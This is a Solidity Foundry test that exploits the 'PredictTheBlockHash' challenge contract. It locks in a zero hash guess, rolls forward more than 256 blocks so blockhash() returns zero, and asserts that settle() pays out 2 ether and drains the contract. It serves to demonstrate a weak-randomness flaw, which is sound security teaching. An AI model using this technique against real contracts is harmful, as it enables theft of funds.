
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockNumber >= 1);
        vm.assume(blockNumber < type(uint256).max - 300);

        // --- 2. State Configuration ---
        vm.deal(address(this), 10 ether);
        
        // Roll to a specific block number
        vm.roll(blockNumber);

        // The vulnerability: blockhash() returns 0 for blocks older than 256 blocks
        // We can exploit this by:
        // 1. Locking in a guess of bytes32(0)
        // 2. Waiting more than 256 blocks
        // 3. Calling settle() - blockhash will return 0, matching our guess

        // Lock in a guess of bytes32(0)
        bytes32 predictedHash = bytes32(0);
        _contractUnderTest.lockInGuess{value: 1 ether}(predictedHash);
        
        // The guess is locked for block.number + 1
        uint256 guessBlock = blockNumber + 1;
        
        // We need to wait more than 256 blocks so blockhash returns 0
        // Roll forward by 257 blocks to ensure blockhash(guessBlock) returns 0
        vm.roll(guessBlock + 257);

        // --- 3. Replication & Assertion ---
        
        // Predict the outcome: blockhash for blocks older than 256 returns 0
        bytes32 expectedAnswer = blockhash(guessBlock);
        
        // Verify our prediction - blockhash should return 0 for old blocks
        assertEq(expectedAnswer, bytes32(0), "blockhash should return 0 for blocks older than 256");
        
        // Our guess matches the expected answer
        assertEq(predictedHash, expectedAnswer, "Predicted hash should match blockhash result");

        // Record balance before settle
        uint256 balanceBefore = address(this).balance;
        
        // Execute settle - should succeed and pay out 2 ether
        _contractUnderTest.settle();
        
        // Verify we received the payout (2 ether)
        uint256 balanceAfter = address(this).balance;
        assertEq(balanceAfter - balanceBefore, 2 ether, "Should receive 2 ether payout");
        
        // Verify contract is drained
        assertEq(address(_contractUnderTest).balance, 0, "Contract should be drained");
    }

    // Required to receive ether from the contract
    receive() external payable {}
}
